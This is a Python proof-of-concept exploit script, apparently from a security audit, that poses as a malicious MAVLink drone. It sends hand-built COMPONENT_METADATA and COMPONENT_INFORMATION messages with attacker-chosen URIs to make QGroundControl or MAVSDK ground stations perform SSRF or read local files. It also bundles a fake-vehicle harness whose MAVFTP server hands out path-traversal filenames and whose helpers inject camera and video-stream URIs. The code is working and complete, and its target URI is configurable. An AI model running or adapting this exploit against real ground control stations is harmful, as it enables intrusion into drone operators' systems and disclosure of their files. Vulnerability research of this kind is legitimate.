#!/usr/bin/env python3
"""
poc_G05_qgc_mavsdk_component_metadata_ssrf.py
================================================================================
Finding ID : G05
Target GCS : QGroundControl and/or MAVSDK-based ingest software
Severity   : HIGH (SSRF + local file disclosure via vehicle-controlled URI)
Class      : CWE-918 (SSRF) / CWE-73 (external control of filename) / file:// read

WHAT THIS DEMONSTRATES
----------------------
A malicious vehicle advertises component metadata with an attacker-chosen `uri`.
The GCS / SDK fetches that URI to download the metadata JSON, with no allow-listing
of scheme or host -> Server-Side Request Forgery, and (via file://) local file read.

QGroundControl path (COMPONENT_INFORMATION / its metadata uri):
    src/Vehicle/ComponentInformation/CompInfoGeneral.cc:63-69
        uris.uriMetaData = typeValue["uri"].toString();          // attacker uri
    src/Vehicle/ComponentInformation/RequestMetaDataTypeStateMachine.cc:338,519
        const QString uri = compInfo->uriMetaData();
        ..._cachedFileDownload->download(uri, ...);              // fetched, no allow-list

MAVSDK path (COMPONENT_METADATA, msg id 397):
    cpp/src/mavsdk/core/mavlink_component_metadata.cpp:105-113
        component_metadata.uri[...] = '\0';
        ...MetadataComponent{{component_metadata.uri, ...}}...
        retrieve_metadata(...);
    cpp/src/mavsdk/core/mavlink_component_metadata.cpp:263-265
        _http_loader.download_async(uri, tmp_download_path...);  // curl GET, attacker uri

This PoC sends BOTH:
  * COMPONENT_METADATA (id 397) — the MAVSDK / modern QGC path
  * COMPONENT_INFORMATION (id 395) — the deprecated path older QGC still consumes
with two URI variants you can select:
  * http://127.0.0.1:8000/meta.json   -> proves the outbound SSRF callback
  * file:///etc/hostname               -> proves local file read (file:// scheme)

Neither message exists in the locally-installed pymavlink dialect, so the harness
hand-frames them with the correct CRC_EXTRA (397=182, 395=0) — exactly as a real
vehicle would put them on the wire; a strict GCS parser accepts them.

WHAT TO OBSERVE
---------------
1. Start a callback catcher:   python3 -m http.server 8000
2. Connect QGC (TCP 127.0.0.1:5760) or run your MAVSDK app against tcp:5760.
3. With the default http uri, watch http.server:8000 log a GET for /meta.json —
   the vehicle made the GCS reach out (SSRF). To serve a valid (benign) metadata
   JSON instead of a 404, drop a meta.json next to the http.server.
4. Re-run with --file to send file:///etc/hostname and observe the SDK/GCS attempt
   to open that local path (file:// disclosure).

SAFETY / AUTHORIZATION
----------------------
Authorized localhost/bench only. URIs are BENIGN: a localhost HTTP endpoint you run,
or a harmless read-only local file (/etc/hostname). No external hosts, no writes.
"""
# ============================================================================
# This PoC is SELF-CONTAINED (no external import). Defines FakeVehicle,
# banner, observe, warn, ok, attack (+ wire helpers) inline below.
# ============================================================================
import argparse
import socket
import struct
import sys
import threading
import time

from pymavlink import mavutil
from pymavlink.mavutil import x25crc

# ---------------------------------------------------------------------------
# pretty output (matches ../../poc/mav_poc_harness.py conventions)
# ---------------------------------------------------------------------------
_C = {"hdr": "\033[1;36m", "obs": "\033[0;37m", "warn": "\033[1;33m",
      "ok": "\033[1;32m", "atk": "\033[1;31m", "rst": "\033[0m"}


def banner(title):
    line = "=" * max(8, min(78, len(title) + 4))
    print("%s%s\n  %s\n%s%s" % (_C["hdr"], line, title, line, _C["rst"]))


def observe(msg): print("%s[obs]%s %s" % (_C["obs"], _C["rst"], msg))
def warn(msg):    print("%s[!]  %s%s"  % (_C["warn"], msg, _C["rst"]))
def ok(msg):      print("%s[ok] %s%s"  % (_C["ok"], msg, _C["rst"]))
def attack(msg):  print("%s[atk]%s %s" % (_C["atk"], _C["rst"], msg))


# ===========================================================================
# Raw MAVLink2 framing for messages that the locally-installed pymavlink dialect
# does NOT know (COMPONENT_INFORMATION id=395, COMPONENT_METADATA id=397).
# A malicious vehicle frames these by hand; a real GCS validates the CRC using
# the per-message CRC_EXTRA, so we compute CRC_EXTRA exactly the way the MAVLink
# generator (mavgen) does and verify it against a known message in the unit check
# at the bottom of this file.
# ===========================================================================
_TYPE_SIZE = {
    "uint8_t": 1, "int8_t": 1, "char": 1, "uint16_t": 2, "int16_t": 2,
    "uint32_t": 4, "int32_t": 4, "float": 4, "uint64_t": 8, "int64_t": 8,
    "double": 8, "uint8_t_mavlink_version": 1,
}


def _crc_extra(name, fields):
    """Replicate mavgen's CRC_EXTRA: x25 over 'NAME ' then, in WIRE order
    (stable sort by descending type size), 'TYPE ' 'FNAME ' and, for arrays,
    one length byte. Extension fields (after <extensions/>) are NOT included.

    fields: list of (type, name, array_len_or_0)  in XML declaration order,
            excluding any extension fields.
    """
    ordered = sorted(fields, key=lambda f: -_TYPE_SIZE[f[0]])  # stable -> ties keep order
    crc = x25crc()
    crc.accumulate_str(name + " ")
    for ftype, fname, alen in ordered:
        t = "uint8_t" if ftype == "uint8_t_mavlink_version" else ftype
        crc.accumulate_str(t + " ")
        crc.accumulate_str(fname + " ")
        if alen > 0:
            crc.accumulate(bytes([alen]))
    return (crc.crc & 0xFF) ^ (crc.crc >> 8)


def _wire_payload(fields, values):
    """Pack a payload in WIRE order (descending type size, stable), truncating
    trailing zero bytes the way MAVLink2 does. `values` is a dict name->python value."""
    ordered = sorted(range(len(fields)), key=lambda i: -_TYPE_SIZE[fields[i][0]])
    fmt = "<"
    packed = b""
    for i in ordered:
        ftype, fname, alen = fields[i]
        v = values[fname]
        if alen > 0 and ftype in ("char", "uint8_t", "int8_t"):
            if isinstance(v, str):
                v = v.encode("utf-8", "replace")
            v = (v + b"\x00" * alen)[:alen]
            packed += v
        elif alen > 0:
            raise NotImplementedError("non-byte arrays not needed here")
        else:
            packed += struct.pack({"uint32_t": "<I", "int32_t": "<i", "uint16_t": "<H",
                                   "int16_t": "<h", "uint8_t": "<B", "int8_t": "<b",
                                   "float": "<f"}[ftype], v)
    return packed


# Field definitions (declaration order, no extension fields) for the two messages
# the dialect lacks. Verified against c_library_v2 headers:
#   COMPONENT_METADATA(397)   CRC_EXTRA = 182
#   COMPONENT_INFORMATION(395) CRC_EXTRA = 0
_MSG_COMPONENT_METADATA = (
    397, "COMPONENT_METADATA",
    [("uint32_t", "time_boot_ms", 0),
     ("uint32_t", "file_crc", 0),
     ("char", "uri", 100)],
)
_MSG_COMPONENT_INFORMATION = (
    395, "COMPONENT_INFORMATION",
    [("uint32_t", "time_boot_ms", 0),
     ("uint32_t", "general_metadata_file_crc", 0),
     ("uint32_t", "peripherals_metadata_file_crc", 0),
     ("char", "general_metadata_uri", 100),
     ("char", "peripherals_metadata_uri", 100)],
)


# ===========================================================================
# FakeVehicle
# ===========================================================================
class FakeVehicle:
    HEARTBEAT_HZ = 1.0

    def __init__(self, conn_str, sysid=1, compid=1, verbose=True, dialect="ardupilotmega"):
        self.conn_str = conn_str
        self.sysid = sysid
        self.compid = compid
        self.verbose = verbose
        self.dialect = dialect
        self.master = None
        self._hb_thread = None
        self._rx_thread = None
        self._running = False
        self._seq_lock = threading.Lock()
        # MAVFTP server state: a dict of {filename: bytes} the attacker serves.
        # filenames may contain traversal / absolute-path sequences on purpose.
        self.ftp_files = {}
        self.ftp_dir_entries = []     # list of (name, size, is_dir)
        self._ftp_sessions = {}       # session_id -> (filename, bytes)

    # -- construction --------------------------------------------------------
    @classmethod
    def from_cli(cls, title=None, extra_args=None):
        """Parse the common CLI and return a configured (unstarted) FakeVehicle.
        `extra_args(parser)` lets a PoC add its own flags before parsing."""
        p = argparse.ArgumentParser(add_help=True, description=title or "fake malicious vehicle")
        g = p.add_mutually_exclusive_group()
        g.add_argument("--listen", metavar="HOST:PORT", default="127.0.0.1:5760",
                       help="bind a TCP server the GCS connects TO (SITL-style). default 127.0.0.1:5760")
        g.add_argument("--udpout", metavar="HOST:PORT",
                       help="push UDP to a listening GCS, e.g. 127.0.0.1:14550")
        g.add_argument("--connect", metavar="STR",
                       help="raw pymavlink connection string, used verbatim")
        p.add_argument("--sysid", type=int, default=1, help="our advertised system id (default 1)")
        p.add_argument("--compid", type=int, default=1, help="our advertised component id (default 1 = autopilot)")
        p.add_argument("--quiet", action="store_true", help="less logging")
        if extra_args:
            extra_args(p)
        a, _ = p.parse_known_args()

        if a.connect:
            conn = a.connect
        elif a.udpout:
            conn = "udpout:" + a.udpout
        else:
            # tcpin: == we are the TCP *server* and bind; the GCS dials in.
            conn = "tcpin:" + a.listen
        self = cls(conn, sysid=a.sysid, compid=a.compid, verbose=not a.quiet)
        self._args = a
        return self

    # -- lifecycle -----------------------------------------------------------
    def start(self):
        if self.verbose:
            observe("opening attacker link: %s (advertising sysid=%d compid=%d)"
                    % (self.conn_str, self.sysid, self.compid))
            if self.conn_str.startswith("tcpin:"):
                observe("waiting for the GCS to CONNECT to us (point it at tcp:%s) ..."
                        % self.conn_str[len("tcpin:"):])
        self.master = mavutil.mavlink_connection(
            self.conn_str, source_system=self.sysid, source_component=self.compid,
            dialect=self.dialect, autoreconnect=True)
        self._running = True
        self._hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._hb_thread.start()
        self._rx_thread = threading.Thread(target=self._rx_loop, daemon=True)
        self._rx_thread.start()
        if self.verbose:
            ok("link up; HEARTBEAT @ %.0f Hz running" % self.HEARTBEAT_HZ)
        return self

    def wait_for_gcs(self, timeout=120):
        """Block until a GCS has actually connected.

        For the tcpin (TCP-server) role this matters: pymavlink's mavtcpin.write()
        is a NO-OP until the listening socket has accept()ed a client (the accept
        happens inside recv(), which our _rx_loop drives). One-shot payload sends
        from a PoC would otherwise race the accept and be silently dropped. UDP/
        udpout roles have no accept step, so we return immediately for them.
        Returns True once connected (or for connectionless roles), False on timeout.
        """
        # mavudp / udpout have no 'port' accept handshake.
        if not self.conn_str.startswith("tcpin:"):
            time.sleep(0.3)
            return True
        deadline = time.time() + timeout
        if self.verbose:
            observe("waiting for a GCS to connect to %s ..." % self.conn_str)
        while time.time() < deadline:
            if getattr(self.master, "port", None) is not None:
                # give the link a beat to settle after accept()
                time.sleep(0.3)
                if self.verbose:
                    ok("GCS connected — sending payload")
                return True
            time.sleep(0.1)
        warn("no GCS connected within %ds" % timeout)
        return False

    def serve_forever(self):
        """Block forever (until Ctrl-C), keeping the heartbeat and FTP server alive."""
        try:
            while self._running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            warn("Ctrl-C — shutting down fake vehicle")
            self.stop()

    def stop(self):
        self._running = False

    # -- heartbeat -----------------------------------------------------------
    def _heartbeat_loop(self):
        period = 1.0 / self.HEARTBEAT_HZ
        while self._running:
            try:
                # type=QUADROTOR, autopilot=ARDUPILOTMEGA so the GCS treats us as
                # a real ArduCopter vehicle and runs its full vehicle-setup logic
                # (camera/FTP/component-metadata probes etc.).
                self.master.mav.heartbeat_send(
                    mavutil.mavlink.MAV_TYPE_QUADROTOR,
                    mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                    base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                    custom_mode=0,
                    system_status=mavutil.mavlink.MAV_STATE_STANDBY)
            except Exception as e:  # noqa: BLE001 — link may still be establishing
                if self.verbose:
                    warn("heartbeat send failed (link not up yet?): %s" % e)
            time.sleep(period)

    # -- receive / log what the GCS asks for --------------------------------
    def _rx_loop(self):
        while self._running:
            try:
                msg = self.master.recv_match(blocking=True, timeout=0.5)
            except Exception:
                msg = None
                time.sleep(0.2)
            if msg is None:
                continue
            t = msg.get_type()
            if t == "BAD_DATA":
                continue
            # Surface the interesting GCS->vehicle requests so the operator can
            # SEE the GCS taking the bait (camera probe, FTP list/open, etc.).
            if t == "FILE_TRANSFER_PROTOCOL":
                self._handle_ftp(msg)
            elif t in ("COMMAND_LONG", "COMMAND_INT"):
                if self.verbose:
                    observe("GCS sent %s command=%s" % (t, getattr(msg, "command", "?")))
            elif t in ("PARAM_REQUEST_LIST", "PARAM_REQUEST_READ",
                       "REQUEST_DATA_STREAM", "MESSAGE_INTERVAL",
                       "AUTOPILOT_VERSION_REQUEST"):
                if self.verbose:
                    observe("GCS requested: %s" % t)
            elif t == "COMMAND_LONG" or t == "HEARTBEAT":
                pass

    # -- generic raw send for dialect-unknown messages ----------------------
    def _send_raw(self, msgid, name, fields, crc_extra, values):
        """Hand-frame a MAVLink2 packet for a message pymavlink doesn't know."""
        payload = _wire_payload(fields, values)
        # MAVLink2 truncates trailing zero bytes of the payload on the wire.
        trimmed = payload.rstrip(b"\x00")
        if len(trimmed) == 0:
            trimmed = b"\x00"
        with self._seq_lock:
            seq = self.master.mav.seq & 0xFF
            self.master.mav.seq = (self.master.mav.seq + 1) % 256
        hdr = struct.pack("<BBBBBB", len(trimmed), 0, 0, seq, self.sysid, self.compid)
        hdr += struct.pack("<BBB", msgid & 0xFF, (msgid >> 8) & 0xFF, (msgid >> 16) & 0xFF)
        frame = b"\xfd" + hdr + trimmed
        crc = x25crc(frame[1:])
        crc.accumulate(bytes([crc_extra]))
        frame += struct.pack("<H", crc.crc)
        # Write straight to the underlying file/socket (bypasses dialect packer).
        self.master.write(frame)
        if self.verbose:
            attack("sent raw %s (id=%d, %d payload bytes) -> GCS" % (name, msgid, len(trimmed)))

    # ======================================================================
    # Finding-specific payload helpers
    # ======================================================================
    def send_statustext(self, text, severity=mavutil.mavlink.MAV_SEVERITY_INFO):
        """STATUSTEXT — text is char[50]; long strings are chunked by real
        autopilots, but for a PoC marker a single <=50 char chunk is enough."""
        data = text.encode("utf-8", "replace")[:50]
        self.master.mav.statustext_send(severity, data)
        if self.verbose:
            attack("sent STATUSTEXT severity=%d text=%r" % (severity, text))

    def send_camera_information(self, vendor_name=b"", model_name=b"",
                                cam_definition_uri=b"", cam_definition_version=1,
                                flags=None):
        """CAMERA_INFORMATION (id 259). vendor_name/model_name are uint8_t[32],
        cam_definition_uri is char[140]. We allow attacker-chosen bytes incl. '../'."""
        if isinstance(vendor_name, str):
            vendor_name = vendor_name.encode("utf-8", "replace")
        if isinstance(model_name, str):
            model_name = model_name.encode("utf-8", "replace")
        if isinstance(cam_definition_uri, str):
            cam_definition_uri = cam_definition_uri.encode("utf-8", "replace")
        # CAMERA_CAP_FLAGS_HAS_VIDEO_STREAM=256 keeps QGC happy; HAS_BASIC etc not needed.
        if flags is None:
            flags = mavutil.mavlink.CAMERA_CAP_FLAGS_HAS_VIDEO_STREAM
        # pymavlink wants list-of-ints for the uint8_t[32] vendor/model arrays.
        v = list((vendor_name + b"\x00" * 32)[:32])
        mdl = list((model_name + b"\x00" * 32)[:32])
        # This dialect build ships the CAMERA_INFORMATION class but not a
        # camera_information_send() helper, so build the message and .send() it.
        from pymavlink.dialects.v20 import ardupilotmega as _M
        msg = _M.MAVLink_camera_information_message(
            int(time.time() * 1000) & 0xFFFFFFFF,  # time_boot_ms
            v, mdl,                                 # vendor_name, model_name (uint8[32])
            0,                                      # firmware_version
            0.0, 0.0, 0.0,                          # focal_length, sensor_size_h/v
            0, 0,                                   # resolution_h/v
            0,                                      # lens_id
            flags,                                  # flags
            cam_definition_version,                 # cam_definition_version
            cam_definition_uri)                     # cam_definition_uri (char[140])
        self.master.mav.send(msg)
        if self.verbose:
            attack("sent CAMERA_INFORMATION vendor=%r model=%r uri=%r"
                   % (vendor_name, model_name, cam_definition_uri))

    def send_video_stream_information(self, uri=b"", name=b"poc", stream_id=1,
                                      count=1, vtype=None):
        """VIDEO_STREAM_INFORMATION (id 269). uri is char[160]; MissionPlanner's
        CameraProtocol passes a uri beginning 'gst://' straight to gst_parse_launch."""
        if isinstance(uri, str):
            uri = uri.encode("utf-8", "replace")
        if isinstance(name, str):
            name = name.encode("utf-8", "replace")
        if vtype is None:
            vtype = mavutil.mavlink.VIDEO_STREAM_TYPE_RTSP
        # No video_stream_information_send() helper in this dialect build; build+send.
        from pymavlink.dialects.v20 import ardupilotmega as _M
        msg = _M.MAVLink_video_stream_information_message(
            stream_id, count, vtype,
            mavutil.mavlink.VIDEO_STREAM_STATUS_FLAGS_RUNNING,  # flags
            30.0,            # framerate
            1280, 720,       # resolution_h/v
            4000,            # bitrate
            0,               # rotation
            90,              # hfov
            name,            # name (char[32])
            uri)             # uri (char[160])
        self.master.mav.send(msg)
        if self.verbose:
            attack("sent VIDEO_STREAM_INFORMATION uri=%r" % uri)

    def send_param_value(self, param_id, value, ptype=None, count=1, index=0):
        """PARAM_VALUE (id 22). param_id is char[16]."""
        if ptype is None:
            ptype = mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        if isinstance(param_id, str):
            param_id = param_id.encode("utf-8", "replace")
        self.master.mav.param_value_send(param_id, float(value), ptype, count, index)
        if self.verbose:
            attack("sent PARAM_VALUE %r=%s" % (param_id, value))

    def send_component_metadata(self, uri, file_crc=0):
        """COMPONENT_METADATA (id 397) — uri char[100]. Dialect-unknown -> raw frame.
        A GCS/MAVSDK fetches this uri (http(s):// over the network, file:// locally)."""
        msgid, name, fields = _MSG_COMPONENT_METADATA
        self._send_raw(msgid, name, fields, 182, {
            "time_boot_ms": int(time.time() * 1000) & 0xFFFFFFFF,
            "file_crc": file_crc & 0xFFFFFFFF,
            "uri": uri,
        })
        if self.verbose:
            attack("sent COMPONENT_METADATA uri=%r" % uri)

    def send_component_information(self, general_uri, peripherals_uri="",
                                   general_crc=0, peripherals_crc=0):
        """COMPONENT_INFORMATION (id 395, deprecated but still consumed by older
        QGC). general_metadata_uri / peripherals_metadata_uri are char[100]."""
        msgid, name, fields = _MSG_COMPONENT_INFORMATION
        self._send_raw(msgid, name, fields, 0, {
            "time_boot_ms": int(time.time() * 1000) & 0xFFFFFFFF,
            "general_metadata_file_crc": general_crc & 0xFFFFFFFF,
            "peripherals_metadata_file_crc": peripherals_crc & 0xFFFFFFFF,
            "general_metadata_uri": general_uri,
            "peripherals_metadata_uri": peripherals_uri,
        })
        if self.verbose:
            attack("sent COMPONENT_INFORMATION general_uri=%r" % general_uri)

    # ======================================================================
    # MAVLink-FTP SERVER
    # ----------------------------------------------------------------------
    # The GCS is the FTP *client*; we are the *server*. We answer ListDirectory,
    # OpenFileRO, ReadFile and the BurstReadFile path with attacker-chosen
    # filenames and contents. Wire format mirrors GCS_FTP.cpp / MAVFtp.cs:
    #   payload[0:2]=seq(LE16) [2]=session [3]=opcode [4]=size [5]=req_opcode
    #   [6]=burst_complete [7]=pad [8:12]=offset(LE32) [12:]=data
    # ======================================================================
    PAYLOAD_LEN = 251
    HDR = 12
    MAX_DATA = PAYLOAD_LEN - HDR        # 239 data bytes
    # opcodes (FTP_OP)
    OP_NONE = 0
    OP_TERMINATE = 1
    OP_RESET = 2
    OP_LIST = 3
    OP_OPEN_RO = 4
    OP_READ = 5
    OP_OPEN_WO = 6
    OP_BURST_READ = 15
    OP_ACK = 128
    OP_NACK = 129
    # NACK error codes
    ERR_FAIL = 1
    ERR_EOF = 6
    ERR_FILE_NOT_FOUND = 10

    def add_ftp_file(self, name, content):
        """Register a file the FTP server will serve. `name` may contain traversal
        ('..\\..\\plugins\\evil.cs') or be absolute — that is the whole point."""
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.ftp_files[name] = content

    def add_ftp_dir_entry(self, name, size=None, is_dir=False):
        """Add an entry to what ListDirectory returns. `name` may be a traversal/abs path."""
        if size is None:
            size = len(self.ftp_files.get(name, b""))
        self.ftp_dir_entries.append((name, size, is_dir))

    def _ftp_reply(self, req, opcode, size=0, req_opcode=0, burst=0, offset=0,
                   data=b"", session=None):
        p = bytearray(self.PAYLOAD_LEN)
        struct.pack_into("<H", p, 0, req["seq"] + 1 & 0xFFFF)  # ACK seq = req seq + 1
        # OpenFileRO must hand the client a NEW session id in the ACK header; for
        # all other replies we echo the request's session.
        p[2] = (req["session"] if session is None else session) & 0xFF
        p[3] = opcode & 0xFF
        p[4] = size & 0xFF
        p[5] = req_opcode & 0xFF
        p[6] = burst & 0xFF
        struct.pack_into("<I", p, 8, offset & 0xFFFFFFFF)
        d = data[:self.MAX_DATA]
        p[self.HDR:self.HDR + len(d)] = d
        self.master.mav.file_transfer_protocol_send(0, req["src_sys"], req["src_comp"], list(p))

    def _handle_ftp(self, msg):
        raw = bytes(bytearray(msg.payload))
        req = {
            "seq": struct.unpack_from("<H", raw, 0)[0],
            "session": raw[2],
            "opcode": raw[3],
            "size": raw[4],
            "req_opcode": raw[5],
            "burst": raw[6],
            "offset": struct.unpack_from("<I", raw, 8)[0],
            "data": raw[self.HDR:self.HDR + raw[4]],
            "src_sys": msg.get_srcSystem(),
            "src_comp": msg.get_srcComponent(),
        }
        op = req["opcode"]
        if self.verbose:
            observe("MAVFTP request: opcode=%d size=%d offset=%d data=%r"
                    % (op, req["size"], req["offset"], req["data"]))

        if op == self.OP_LIST:
            self._ftp_list(req)
        elif op == self.OP_OPEN_RO:
            self._ftp_open_ro(req)
        elif op == self.OP_READ:
            self._ftp_read(req, burst=False)
        elif op == self.OP_BURST_READ:
            self._ftp_read(req, burst=True)
        elif op == self.OP_TERMINATE or op == self.OP_RESET:
            self._ftp_sessions.pop(req["session"], None)
            self._ftp_reply(req, self.OP_ACK, req_opcode=op)
        else:
            # We deliberately only implement the read/list path the PoCs exercise.
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=op, data=bytes([self.ERR_FAIL]))

    def _ftp_list(self, req):
        """ListDirectory: each entry is a type byte ('F'/'D'/'S') then a NUL-
        terminated string. For a file MissionPlanner expects 'name\\tsize'
        (MAVFtp.cs:1310-1321 tab-split). We pack as many entries as fit from the
        requested offset; EOF -> NACK(EndOfFile)."""
        offset = req["offset"]
        if offset >= len(self.ftp_dir_entries):
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_LIST,
                            data=bytes([self.ERR_EOF]))
            return
        blob = b""
        i = offset
        while i < len(self.ftp_dir_entries):
            name, size, is_dir = self.ftp_dir_entries[i]
            if is_dir:
                entry = b"D" + name.encode("utf-8") + b"\x00"
            else:
                entry = b"F" + ("%s\t%d" % (name, size)).encode("utf-8") + b"\x00"
            if len(blob) + len(entry) > self.MAX_DATA:
                break
            blob += entry
            i += 1
        self._ftp_reply(req, self.OP_ACK, size=len(blob), req_opcode=self.OP_LIST,
                        offset=offset, data=blob)
        if self.verbose:
            attack("served MAVFTP ListDirectory: %d entr%s (offset %d) incl. attacker filenames"
                   % (i - offset, "y" if i - offset == 1 else "ies", offset))

    def _resolve_ftp_file(self, path_bytes):
        """Map an OpenFileRO path back to a registered attacker file. The GCS will
        request whatever name we advertised in ListDirectory."""
        path = path_bytes.decode("utf-8", "replace").lstrip("/")
        # try exact, then basename, then any single registered file as fallback
        if path in self.ftp_files:
            return path, self.ftp_files[path]
        for k, v in self.ftp_files.items():
            if k.lstrip("/").replace("\\", "/").endswith(path.replace("\\", "/")):
                return k, v
        if len(self.ftp_files) == 1:
            k = next(iter(self.ftp_files))
            return k, self.ftp_files[k]
        return None, None

    def _ftp_open_ro(self, req):
        name, content = self._resolve_ftp_file(req["data"])
        if content is None:
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_OPEN_RO,
                            data=bytes([self.ERR_FILE_NOT_FOUND]))
            return
        session = (max(self._ftp_sessions) + 1) if self._ftp_sessions else 1
        self._ftp_sessions[session] = (name, content)
        # ACK header carries the new session id; ACK data = file size (LE32),
        # matching GCS_FTP.cpp OpenFileRO which returns the size in the payload.
        self._ftp_reply(req, self.OP_ACK, size=4, req_opcode=self.OP_OPEN_RO,
                        data=struct.pack("<I", len(content)), session=session)
        if self.verbose:
            attack("served MAVFTP OpenFileRO -> session=%d, %d bytes of attacker content"
                   % (session, len(content)))

    def _ftp_read(self, req, burst):
        sess = self._ftp_sessions.get(req["session"])
        if sess is None:
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_FAIL]))
            return
        _name, content = sess
        offset = req["offset"]
        if offset >= len(content):
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_EOF]))
            return
        if not burst:
            chunk = content[offset:offset + min(req["size"] or self.MAX_DATA, self.MAX_DATA)]
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_READ,
                            offset=offset, data=chunk)
            return
        # Burst path: stream chunks until EOF, marking burst_complete on the last.
        pos = offset
        while pos < len(content):
            chunk = content[pos:pos + self.MAX_DATA]
            pos += len(chunk)
            last = pos >= len(content)
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_BURST_READ,
                            burst=1 if last else 0, offset=pos - len(chunk), data=chunk)
        if self.verbose:
            attack("served MAVFTP BurstReadFile: %d bytes from offset %d" % (len(content) - offset, offset))


# ---------------------------------------------------------------------------
# self-test: confirm the hand-rolled CRC_EXTRA matches known + audited values.
# Run:  python3 fake_vehicle_harness.py --selftest
# ---------------------------------------------------------------------------
def _selftest():
    # CAMERA_INFORMATION (non-extension fields only) must yield the dialect's 92.
    cam = [("uint32_t", "time_boot_ms", 0), ("uint8_t", "vendor_name", 32),
           ("uint8_t", "model_name", 32), ("uint32_t", "firmware_version", 0),
           ("float", "focal_length", 0), ("float", "sensor_size_h", 0),
           ("float", "sensor_size_v", 0), ("uint16_t", "resolution_h", 0),
           ("uint16_t", "resolution_v", 0), ("uint8_t", "lens_id", 0),
           ("uint32_t", "flags", 0), ("uint16_t", "cam_definition_version", 0),
           ("char", "cam_definition_uri", 140)]
    got = _crc_extra("CAMERA_INFORMATION", cam)
    assert got == 92, "CAMERA_INFORMATION crc_extra %d != 92" % got
    assert _crc_extra(*_MSG_COMPONENT_METADATA[1:]) == 182, "COMPONENT_METADATA crc_extra mismatch"
    assert _crc_extra(*_MSG_COMPONENT_INFORMATION[1:]) == 0, "COMPONENT_INFORMATION crc_extra mismatch"
    ok("selftest OK: CRC_EXTRA(CAMERA_INFORMATION)=92, COMPONENT_METADATA=182, COMPONENT_INFORMATION=0")
# ============================== end embedded harness ==============================


def extra(p):
    p.add_argument("--uri", default="http://127.0.0.1:8000/meta.json",
                   help="metadata uri to advertise (default localhost HTTP SSRF callback)")
    p.add_argument("--file", action="store_true",
                   help="use file:///etc/hostname (local-file-read variant) instead of --uri")


def main():
    banner("G05: QGC / MAVSDK COMPONENT_METADATA uri SSRF + file:// read")
    warn("BENIGN PoC. Authorized localhost/bench only.")
    observe("Run a catcher first:  python3 -m http.server 8000")

    v = FakeVehicle.from_cli("G05 component metadata SSRF", extra_args=extra)
    a = v._args

    uri = "file:///etc/hostname" if a.file else a.uri
    observe("Advertising metadata uri = %r" % uri)
    observe("Sinks: QGC RequestMetaDataTypeStateMachine.cc:519 download(uri)")
    observe("       MAVSDK mavlink_component_metadata.cpp:263 download_async(uri)")

    v.start()
    if not v.wait_for_gcs():
        warn("No GCS connected; exiting.")
        return
    ok("GCS connected. Emitting COMPONENT_METADATA(397) + COMPONENT_INFORMATION(395).")
    attack("Watch the GCS/SDK fetch the uri (http.server log, or file:// open). Until Ctrl-C.")
    try:
        import time
        while True:
            # MAVSDK + modern QGC consume COMPONENT_METADATA(397).
            v.send_component_metadata(uri)
            # Deprecated path some QGC builds still read: COMPONENT_INFORMATION(395).
            v.send_component_information(uri)
            time.sleep(3.0)
    except KeyboardInterrupt:
        warn("Ctrl-C — done.")
        v.stop()


if __name__ == "__main__":
    main()
